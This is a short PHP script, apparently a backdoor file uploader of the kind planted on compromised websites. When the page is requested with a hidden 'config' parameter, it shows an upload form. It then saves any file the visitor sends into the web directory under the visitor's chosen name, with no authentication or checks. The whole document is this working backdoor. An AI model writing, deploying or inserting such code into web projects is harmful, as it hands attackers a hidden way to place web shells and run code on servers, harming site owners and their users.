<?php if(isset($_GET['config']))
{
echo "<body bgcolor=black>
<font color=cyan size=3>";
echo "<hr>";
    echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
<label for=\"file\">File:</label>
<input type=\"file\" name=\"file\" id=\"file\" />
<br />
<input type=\"submit\" name=\"submit\" value=\"GET\">
</form>";
if ($_FILES["file"]["error"] > 0)
  {
  echo "Error: " . $_FILES["file"]["error"] . "<br />";
  }
else
  {
  echo "Upload: " . $_FILES["file"]["name"] . "<br />";
  echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
  echo "Stored in: " . $_FILES["file"]["tmp_name"];
  }
if (file_exists("" . $_FILES["file"]["name"]))
      {
      echo $_FILES["file"]["name"] . " Wes Enek. ";
      }
    else
      {
      move_uploaded_file($_FILES["file"]["tmp_name"],
      "" . $_FILES["file"]["name"]);
      echo "Stored in: " . "" . $_FILES["file"]["name"];
echo"<hr>";
      }
  }

?> 